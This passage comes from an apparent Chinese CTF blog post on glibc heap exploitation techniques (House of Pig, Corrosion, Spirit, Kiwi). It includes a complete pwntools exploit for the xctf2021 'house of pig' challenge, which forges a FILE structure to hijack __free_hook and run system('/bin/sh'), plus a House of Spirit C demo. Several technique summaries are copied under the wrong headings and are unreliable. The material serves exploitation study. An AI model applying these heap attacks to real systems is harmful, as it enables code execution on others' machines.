class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>构造 FILE 结构的时候，重点是将其 <strong>vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow。</strong></p>
<p>而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc,memcpy,free三个函数，且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p>
<p>那么适当的构造 FILE 结构中的数据，就可以实现</p>
<ol>
<li>利用 IO_str_overflow 函数中的 <code>malloc</code> 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk；</li>
<li>紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的<code>memcpy</code> 写入到刚刚申请出来的包含<code>__free_hook</code>的这个 chunk，从而能任意控制 <code>__free_hook</code> ，这里可以将其修改为 system函数地址；</li>
<li>最后调用 IO_str_overflow 函数中的 <code>free</code> 时，就能够触发 __free_hook ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。</li>
</ol>
<p>FILE结构的参数应满足</p>
<ol>
<li>_IO_NO_WRITES标志为false,_IO_USER_BUF标志为false</li>
<li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base <strong>&gt;=</strong> fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - 1</li>
<li>fp-&gt;_IO_buf_base指向存储有”/bin/sh”和system地址的chunk,old_buf中的内容复制到new_buf时应注意对应</li>
<li>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base合适</li>
</ol>
<h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><strong>xctf2021-house of pig</strong></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序只使用calloc,这就意味着不会使用tcache</p>
<p>主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p>
<p>也就是说一只猪猪释放了一个chunk后,切换成另一只猪猪再切换回来,就能uaf</p>
<p>c++反编译出来的代码看不太懂</p>
<p>暂时先这样</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;182.92.203.154&#x27;, 35264)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, content</span>):</span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">user</span>):</span><br><span class="line">    Menu(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">3</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;source ./libcdebug/loadsym.py</span></span><br><span class="line"><span class="string">	loadsym /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line"><span class="comment">#----- prepare tcache_stashing_unlink_attack</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)    <span class="comment"># B0~B4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xb0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B5 split 0x160 to 0xc0 and 0xa0</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># B6 split 0x190 to 0xf0 and 0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- leak libc_base and heap_base</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x48</span>) <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">16</span>)<span class="comment">#put A16 into unsorted</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># B8   make A16 into largebin</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(rl()) - <span class="number">0x1ebfe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(rl()) - <span class="number">0x13940</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ebfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A17</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A19</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x168</span>) <span class="comment"># B9</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attack</span></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x118</span>) <span class="comment"># C1</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, payload) <span class="comment"># C3 change fake FILE _chain</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span></span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1ED560</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">Menu(<span class="number">5</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h1><h2 id="概要-7"><a href="#概要-7" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>需要一个UAF漏洞</li>
<li>可以分配较大的堆块（size &lt;=0x3b00)</li>
</ol>
<p><strong>利用效果:</strong></p>
<p><strong>有效版本:</strong>2.32以前</p>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>首先要先知道 global_max_fast 是 GLIBC 用来储存 fastbin 链表能够储存的最大大小，其默认值为 0x80，也就是 Fastbin 的默认 Size 范围是在 [0x20, 0x80]。</p>
<p>而此方法，其根本的思想就是通过往 global_max_fast 写入一个很大的值，来造成 fastbinsY 数组溢出。如果利用其他漏洞在这个位置写一个很大的值，会使得在 malloc 和 free 堆块的时候，很大 Size 堆块都被判定为是 fastbin 类型的堆块，fastbinsY 是在 GLIBC 上储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin 链表预留了十个指针。</p>
<p>这意味着，如果有 SIZE 超过 0xB0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY 的最大范围，造成数组越界。可以使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY 首地址的差值。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (delta * 2) + 0x20</span><br></pre></td></tr></table></figure>
<p>不过也可以看出只能覆写比fastbinY高处的东西</p>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h2 id="概要-8"><a href="#概要-8" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能free指定地址</li>
</ol>
<p><strong>利用效果:</strong>获得包含目标地址的chunk</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>在可控区域伪造或寻找一个fake_chunk,并free它,使其进入fastbin中</p>
<p>fake_chunk的条件</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li>
<li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li>
<li>不能double free</li>
</ul>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h2 id="概要-9"><a href="#概要-9" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够触发<code>__malloc_assert</code>,通常是堆溢出导致</li>
<li>能够任意写,修改<code>_IO_file_sync</code>和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<p><strong>注意:</strong>因为house of kiwi要求能够修改libio中的vtable,这在许多版本glibc中是被禁止的,所以house of kiwi中提到的这条利用链不一定能够实现,但是其为我们提供了一个显式调用IO的方法,即通过assert触发fflush(stderr),从而调用stderr的vtable的sync,可以利用修改vtable偏移去调用别的vtable指针</p>
<h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><h3 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h3><ul>
<li><p>GLIBC 2.32/malloc.c:288</p>
<p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用_IO_file_jumps中的sync指针</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line"><span class="built_in">fflush</span> (stderr);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如何触发assert?在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk))位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p>
</li>
<li><p>GLIBC 2.32/malloc.c:2394</p>
